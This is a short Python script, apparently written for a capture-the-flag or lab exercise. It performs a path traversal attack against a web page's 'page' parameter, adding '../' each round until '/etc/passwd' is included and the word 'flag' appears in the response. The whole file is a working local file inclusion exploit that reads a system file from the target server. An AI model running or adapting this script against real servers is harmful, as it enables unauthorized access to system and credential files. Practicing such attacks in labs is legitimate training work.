import re
import requests
from bs4 import BeautifulSoup

path = '../'

def get_IP():
	ip = None
	with open('../../IP') as file:
		return file.readlines()[0].strip()


while(1):
	url = get_IP() + '?page='+path+'etc/passwd'
	
	r = requests.get(url)
	soup = BeautifulSoup(r.content, 'html.parser')
	found = re.findall('\\b' + 'flag' + '\\b', str(soup))
	result = re.search("alert\('(.*)'\);", str(soup))
	print(f"?{url.split('?')[1]} :: alert :: [ {result[1]} ]")
	if found:
		break 
	else:
		path = path+'../'
 
 